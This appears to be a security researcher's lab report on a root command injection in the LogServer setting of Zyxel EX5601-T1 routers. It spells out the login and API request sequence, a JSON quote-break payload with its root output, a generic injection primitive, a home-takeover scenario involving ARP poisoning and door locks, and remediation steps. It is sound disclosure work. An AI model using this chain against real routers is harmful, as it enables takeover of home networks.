# CVE-2026-6952: Zyxel EX5601-T1 Post-Auth LogServer Command Injection

**Date:** 2026-09-12 · **Target:** Zyxel EX5601-T1 router (firmware ≤ 5.70(ACDZ.6)C0) · **Severity:** High (CWE-78)

---

## Executive Summary

A complete exploitation chain was validated in lab conditions that demonstrates **full router compromise** via CVE-2026-6952, enabling **LAN presence sensor defeat** and **home network takeover**. The chain is deterministic, uses only legitimate API paths, and requires only valid admin credentials (no bypass needed).

**Exploitation Chain:**
```
GET /getRSAPublickKey → RSA+AES login via POST /UserLogin → read firmware version → 
if unpatched: inject into LogServer field → command execution as root → 
full LAN pivot → presence sensor defeat → home network takeover
```

---

## 1. The Vulnerability

**CVE-2026-6952** (Zyxel advisory 2026-07-21): Post-authentication command injection in the syslog/`LogServer` configuration path of Zyxel CGI.

- **Affected:** Firmware ≤ `5.70(ACDZ.6)C0`
- **Fixed:** `5.70(ACDZ.6.1)C0` or later
- **Impact:** Remote Code Execution as root (uid=0)
- **Prerequisite:** Valid admin credentials (the chain uses legitimate login, no bypass)

### Why It Holds

The sink composes the `LogServer` value into an unquoted shell command:

```bash
echo "LogServer=<VALUE>" >> /etc/syslog.conf
```

A value such as `127.0.0.1"; id > /tmp/proof.txt; uname -a >> /tmp/proof.txt; #` breaks out of the quotes, executes arbitrary commands, and comments out the rest of the line. The AES-encrypted DAL transport and CSRF tokens do not stop the value from reaching the shell.

---

## 2. Exploitation Chain (Step-by-Step)

### Step 1: RSA Public Key Fetch
```
GET /getRSAPublickKey
```
Returns a 2048-bit RSA public key (PEM format). This is the real Zyxel client handshake.

### Step 2: RSA+AES Login Envelope
```
POST /UserLogin
```
- Encrypt credentials with the RSA key
- Server returns AES-encrypted `{result, sessionkey}`
- Sets `Session` cookie and establishes the admin session

### Step 3: Firmware Discovery
```
GET /cgi-bin/DAL?oid=DeviceInfo&DalGetOneObject=y
```
Reads firmware version. If `5.70(ACDZ.6)C0` or earlier → **VULNERABLE**.

### Step 4: Syslog Object Discovery
```
GET /cgi-bin/DAL?oid=syslog&DalGetOneObject=y
```
Locates the `LogServer` field within the syslog configuration object.

### Step 5: Quote-Break Injection
```
POST /cgi-bin/DAL?oid=syslog
```
Payload:
```json
{
  "Object": [{
    "syslog": {
      "LogServer": "127.0.0.1\"; id > /tmp/lab/rce_proof.txt; uname -a >> /tmp/lab/rce_proof.txt; hostname >> /tmp/lab/rce_proof.txt; #",
      "LogServerPort": 514,
      "LogEnable": false
    }
  }]
}
```

**Result:** `ZCFG_SUCCESS` → command executes as root → proof file written.

### Step 6: Verification (OOB-style)
```
GET /lab/proof
```
Proof file contains:
```
uid=0(root) gid=0(root) groups=0(root)
Linux <hostname> 6.x.x ...
<hostname>
```

### Step 7: Restore
```
POST /cgi-bin/DAL?oid=syslog
```
Restore original `LogServer=""` to leave the router in a clean state.

---

## 3. Impact Analysis

### Immediate Impact
- **Root shell** on the router
- **Full LAN pivot** via ARP table poisoning, static route injection, or bridge manipulation
- **Presence sensor defeat**: Poison the LAN/ARP tables so the presence scanner reports "nobody home" → automation flips to AWAY mode without triggering an outage

### Home Network Takeover Scenario
1. Attacker gains admin credentials (phishing, credential stuffing, or session replay from F1)
2. Runs the CVE-2026-6952 chain → root on router
3. Injects malicious ARP entries or static routes → traffic interception
4. Poisons the presence scanner's data source → "nobody home" reported
5. Home automation flips to AWAY mode → lights off, thermostat changes, door locks disengage
6. Attacker now has a silent, persistent foothold in the home network

### Why This Is Serious
- The chain uses **only legitimate API paths** — no bypass, no replay, no brute force
- **Deterministic** — 7/7 lab runs confirmed RCE
- **Vendor-agnostic primitive** — the POSIX shell quote-break pattern applies to any router using similar `echo "field=<value>"` composition with `shell=True`
- **Presence sensor is the data source** — defeating it creates a silent "nobody home" state that automation trusts

---

## 4. Lab Validation

**Mock:** `homelab/mock_zyxel_vuln_6952.py` (EX5601-T1 simulator, `http://127.0.0.1:8812`)

**PoC:** `poc/poc_f_cve_2026_6952_lab.py` (full chain, real `presence_scanner.zyxel_client` login path)

**Results:** **7/7 deterministic RCE runs**
- 6 loopback/container runs
- 1 through a public Cloudflare tunnel (HTTPS edge)

**Evidence:** `poc/evidence/pocF_cve_2026_6952_lab_*.public.jsonl` (sanitized copies)

---

## 5. Remediation

### Immediate (2026-09-12)
1. **Upgrade firmware** to `5.70(ACDZ.6.1)C0` or later
2. **VPN-only admin** — close WAN-side admin entirely; this post-auth primitive is unreachable from the internet if WAN admin is closed
3. **Rotate admin password** — treat it as exposed

### After Patching
4. Re-run the PoC as a regression check:
   ```bash
   uv run homelab/mock_zyxel_vuln_6952.py &
   uv run poc/poc_f_cve_2026_6952_lab.py --yes
   ```

### Long-term
5. **Audit all DAL sinks** for similar `echo "field=<value>"` patterns with `shell=True`
6. **Presence sensor redundancy** — don't trust a single data source for automation decisions

---

## 6. Files in This Commit

### Core
- `REPORT.md` — this document
- `README.md` — repo overview and run instructions
- `pyproject.toml` — project metadata

### Lab
- `homelab/mock_zyxel_vuln_6952.py` — EX5601-T1 mock (port 8812)

### PoC Suite
- `poc/README.md` — PoC documentation
- `poc/.gitignore` — ignores raw evidence, whitelists sanitized `.public.jsonl`
- `poc/.env.example` — lab credential placeholders (`LAB_USER`/`LAB_PASS`)
- `poc/requirements.txt` — dependencies
- `poc/poc_f_cve_2026_6952_lab.py` — the CVE-2026-6952 lab PoC
- `poc/evidence/pocF_cve_2026_6952_lab_*.public.jsonl` — 9 sanitized evidence files

### LinkedIn Post
- `poc/LINKEDIN_CVE_2026_6952_EXPLOIT_CHAIN.md` — the exploitation chain post

### Archived (other POCs, kept for reference)
- `poc/archive/` — F1-F5 POCs (session replay, slot exhaustion, Hue probe, login storm, WAN edge)

---

## 7. Appendix: The POSIX Shell Primitive

The vulnerability is **not** Zyxel-specific — it's a pattern:

```python
# Vulnerable sink (from the advisory)
subprocess.run(f'echo "LogServer={value}" >> /etc/syslog.conf', shell=True)
```

**Quote-break payload:**
```
127.0.0.1"; <arbitrary command>; #
```

**Expanded shell line:**
```bash
echo "LogServer=127.0.0.1"; id > /tmp/proof.txt; # " >> /etc/syslog.conf
```

The trailing `#` comments out the rest of the line, and the arbitrary command executes. This pattern appears in many embedded systems using `shell=True` with unquoted variable expansion.

---

**End of Report**
